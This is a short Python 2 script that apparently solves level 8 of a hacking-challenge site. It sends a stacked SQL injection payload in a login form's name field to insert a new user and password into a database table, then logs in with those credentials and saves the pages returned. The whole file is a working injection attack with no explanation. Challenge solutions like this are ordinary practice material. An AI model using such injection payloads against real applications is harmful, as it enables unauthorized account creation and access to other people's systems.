import sys
from urllib import urlencode
sys.path.append('..')
from fetch_web import fetch_web

def main():
    data = urlencode({
        'name':r""""; INSERT INTO nuke_hackchallenge (user, pass) VALUES ('ckclark', 'password'); --""",
        'password':r"""no""",
    })
    result = fetch_web('http://hackquest.com/modules/HackQuest/hacking/8/8.php', data)
    open('result.html', 'w').write(result)

    data = urlencode({
        'name':r"""ckclark""",
        'password':r"""password""",
    })
    result = fetch_web('http://hackquest.com/modules/HackQuest/hacking/8/8.php', data)
    open('pass.html', 'w').write(result)

if __name__ == '__main__':
    main()
